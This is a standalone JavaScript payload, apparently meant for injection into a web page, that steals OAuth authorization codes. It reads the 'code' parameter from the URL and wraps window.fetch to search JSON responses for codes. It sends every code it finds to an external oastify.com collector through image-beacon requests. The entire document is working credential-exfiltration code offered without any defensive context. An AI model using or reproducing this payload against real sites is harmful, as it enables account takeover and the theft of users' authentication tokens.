(() => {
  const COLLECT = 'https://y547vchc51sydy652hdvlixmxd34rwfl.oastify.com/collect';
  
  function exfil(name, data){
    new Image().src = COLLECT + '?k=' + encodeURIComponent(name) + '&v=' + encodeURIComponent(data);
  }

  // Hook URL after redirect
  const urlParams = new URLSearchParams(window.location.search);
  const code = urlParams.get('code');
  if(code){
    exfil('oauth_code', code);
  }

  // Optionally hook fetch / XHR to catch the code in JSON
  const _fetch = window.fetch;
  window.fetch = function(input, init){
    return _fetch.apply(this, arguments).then(async res => {
      try{
        const r = res.clone();
        const ct = r.headers.get('content-type') || '';
        if(ct.includes('application/json')){
          const txt = await r.text().catch(()=>'');
          const match = txt.match(/code=(\d{6,})/);
          if(match) exfil('oauth_code', match[1]);
        }
      }catch(e){}
      return res;
    });
  };
})();
